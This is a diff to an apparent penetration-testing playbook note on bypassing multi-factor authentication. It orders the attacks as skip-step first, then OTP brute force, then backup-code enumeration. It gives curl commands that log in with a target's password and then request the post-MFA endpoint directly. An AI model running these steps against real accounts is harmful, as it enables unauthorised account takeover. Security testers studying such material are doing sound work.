@@ -1,8 +1,6 @@
 
 Bypass multi-factor authentication (MFA / 2FA / OTP). Entry from [[Web Attack Checksheet]] sub-block 1.6 when multi-step verification observed.
 
-Sister files: [[Credential Attacks]] (first-factor password recovery), [[Session Cookie Attacks]] (session state manipulation), [[Login Bypass Techniques]] (may bypass first factor).
-
 Precondition: valid first-factor credentials (username + password). If not yet recovered → return to [[Credential Attacks]] before entering this file.
 
 Ordering: skip-step attacks first (fastest — one request may bypass entirely); OTP brute force (fast if rate limit weak); backup code enumeration (if backup mechanism exists).
@@ -23,7 +21,7 @@ Some apps only enforce MFA in the UI flow; the post-MFA endpoint accepts request
 
 ```bash
 # Log in but don't complete MFA
-curl -sX POST -c cookies.txt -d 'username=<target_user>&password=<target_pass>' http://<host>:<port>/<login_path>
+curl -sX POST -c cookies.txt -d '<login_username_field>=<target_user>&<login_password_field>=<target_pass>' http://<host>:<port>/<login_form_action>
 
 # Try post-MFA endpoint directly
 curl -s -b cookies.txt -i http://<host>:<port>/<post_mfa_path>
